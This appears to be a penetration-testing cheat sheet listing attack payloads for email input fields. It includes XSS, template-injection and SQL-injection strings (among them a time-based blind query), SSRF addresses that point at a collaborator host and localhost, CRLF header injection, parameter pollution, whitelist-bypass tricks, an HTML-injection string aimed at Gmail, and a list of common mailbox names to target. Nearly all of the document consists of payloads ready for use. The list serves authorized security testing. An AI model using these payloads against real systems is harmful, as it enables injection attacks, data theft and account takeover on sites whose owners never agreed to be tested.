# Email attacks

| Attack                   | Payload                                                                                                                                          |
| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| XSS                      | <p>test+(alert(0))@example.com</p><p>test@example(alert(0)).com</p><p>"alert(0)"@example.com</p><p>&#x3C;script src=//xsshere?”@email.com</p>    |
| Template injection       | <p>"&#x3C;%= 7 * 7 %>"@example.com</p><p> test+(${{7*7}})@example.com</p>                                                                        |
| SQLi                     | <p>"' OR 1=1 -- '"@example.com </p><p>"mail'); SELECT version();--"@example.com</p><p>a'-IF(LENGTH(database())=9,SLEEP(7),0)or'1'='1\"@a.com</p> |
| SSRF                     | <p>john.doe@abc123.burpcollaborator.net</p><p>john.doe@[127.0.0.1]</p>                                                                           |
| Parameter Pollution      | victim\&email=attacker@example.com                                                                                                               |
| (Email) Header Injection | <p>"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com</p><p>"recipient@test.com>\r\nRCPT TO:&#x3C;victim+"@test.com</p>                         |
| Wildcard abuse           | %@example.com                                                                                                                                    |

```
# Bypass whitelist
inti(;inti@inti.io;)@whitelisted.com
inti@inti.io(@whitelisted.com)
inti+(@whitelisted.com;)@inti.io

#HTML Injection in Gmail
inti.de.ceukelaire+(<b>bold<u>underline<s>strike<br/>newline<strong>strong<sup>sup<sub>sub)@gmail.com

# Bypass strict validators
# Login with SSO & integrations
GitHub & Salesforce allow xss in email, create account and abuse with login integration

# Common email accounts
support@
jira@
print@
feedback@
asana@
slack@
hello@
bug(s)@
upload@
service@
it@
test@
help@
tickets@
tweet@
```
